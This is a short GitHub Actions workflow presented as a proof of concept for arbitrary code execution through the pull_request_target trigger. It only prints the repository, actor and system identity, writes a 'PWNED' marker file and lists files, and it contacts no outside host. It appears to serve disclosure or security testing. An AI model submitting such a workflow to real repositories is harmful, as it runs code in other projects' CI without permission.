name: PoC - RCE Demonstration

on:
  pull_request_target:

jobs:
  rce-poc:
    name: "Arbitrary Code Execution PoC"
    runs-on: ubuntu-latest
    steps:
      - name: Confirm execution
        run: |
          echo "✅ Arbitrary code execution in base repo workflow!"
          echo "Repository: $GITHUB_REPOSITORY"
          echo "Actor: $GITHUB_ACTOR"
          uname -a
          id
          echo "PWNED" > exploit_proof.txt
          ls -la
          cat exploit_proof.txt
